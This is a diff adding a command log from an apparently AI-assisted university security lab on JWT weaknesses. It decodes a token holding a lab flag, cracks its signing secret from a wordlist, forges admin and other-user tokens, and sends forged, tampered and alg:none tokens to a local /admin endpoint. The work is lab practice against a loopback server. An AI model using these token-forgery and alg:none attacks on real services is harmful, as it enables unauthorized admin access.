@@ -1,0 +1,18 @@
+# HTTP real contra el Handler original, sin modificarlo; puerto efímero en loopback. Corrida asistida por IA.
+# HTTPConnection: GET http://127.0.0.1:54232/login?user=diego&pass=diego123
+C:\Users\carol\AppData\Local\Programs\Python\Python312\python.exe -X utf8 "C:\Users\carol\Documents\Seguridad Informática\LabsSeguridadInformatica2026\entregas\labextra5\grupo10\jwt_tool.py" decodificar eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJkaWVnbyIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzkzNzM5MzQ0LCJleHAiOjE3OTM3NDI5NDQsIm5vdGFfaW50ZXJuYSI6ImRlcGxveS10YWcgRkxBR3tqd3Rfc29sb19iYXNlNjR9In0.P90v5C9BokTjjd7Fwj3CmkdTSKOiSG36kOZb0QtQico > 03-decodificado.txt 2> 03-decodificado.stderr.txt
+C:\Users\carol\AppData\Local\Programs\Python\Python312\python.exe -X utf8 "C:\Users\carol\Documents\Seguridad Informática\LabsSeguridadInformatica2026\entregas\labextra5\grupo10\jwt_tool.py" crackear eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJkaWVnbyIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzkzNzM5MzQ0LCJleHAiOjE3OTM3NDI5NDQsIm5vdGFfaW50ZXJuYSI6ImRlcGxveS10YWcgRkxBR3tqd3Rfc29sb19iYXNlNjR9In0.P90v5C9BokTjjd7Fwj3CmkdTSKOiSG36kOZb0QtQico "C:\Users\carol\Documents\Seguridad Informática\LabsSeguridadInformatica2026\labs\labextra5-jwt\caso\diccionario.txt" > 04-crack.txt 2> 04-crack.stderr.txt
+C:\Users\carol\AppData\Local\Programs\Python\Python312\python.exe -X utf8 "C:\Users\carol\Documents\Seguridad Informática\LabsSeguridadInformatica2026\entregas\labextra5\grupo10\jwt_tool.py" forjar mate123 --sub diego --role admin > 05-token-admin.txt 2> 05-token-admin.stderr.txt
+# HTTPConnection: GET http://127.0.0.1:54232/admin
+# Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJkaWVnbyIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc5MzczOTM0NCwiZXhwIjoxNzkzNzQyOTQ0fQ.FyXSeI5vkb_ad0dzfvVza72dYo1InXpNRhqwYhncuyY
+C:\Users\carol\AppData\Local\Programs\Python\Python312\python.exe -X utf8 "C:\Users\carol\Documents\Seguridad Informática\LabsSeguridadInformatica2026\entregas\labextra5\grupo10\jwt_tool.py" forjar mate123 --sub maria --role user > 07-token-maria.txt 2> 07-token-maria.stderr.txt
+# HTTPConnection: GET http://127.0.0.1:54232/perfil
+# Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJtYXJpYSIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzkzNzM5MzQ0LCJleHAiOjE3OTM3NDI5NDR9.aAxRXMXJ7JLoa0ejjK_4OyzsC-Gjf3BJiCQpOV-n0NY
+# HTTPConnection: GET http://127.0.0.1:54232/admin
+# Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJkaWVnbyIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzkzNzM5MzQ0LCJleHAiOjE3OTM3NDI5NDQsIm5vdGFfaW50ZXJuYSI6ImRlcGxveS10YWcgRkxBR3tqd3Rfc29sb19iYXNlNjR9In0.P90v5C9BokTjjd7Fwj3CmkdTSKOiSG36kOZb0QtQico
+# HTTPConnection: GET http://127.0.0.1:54232/admin
+# Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJkaWVnbyIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc5MzczOTM0NCwiZXhwIjoxNzkzNzQyOTQ0fQ.AyXSeI5vkb_ad0dzfvVza72dYo1InXpNRhqwYhncuyY
+# HTTPConnection: GET http://127.0.0.1:54232/admin
+# Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJkaWVnbyIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc5MzczOTM0NCwiZXhwIjoxNzkzNzQyOTQ0fQ.
+# HTTPConnection: GET http://127.0.0.1:54232/admin
+# Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJkaWVnbyIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc5MzczOTM0NCwiZXhwIjoxNzkzNzQyOTQ0fQ.VKVBOe342pXBzkS1CyksBsG4gbJDRgqnUThGvAgp7CU
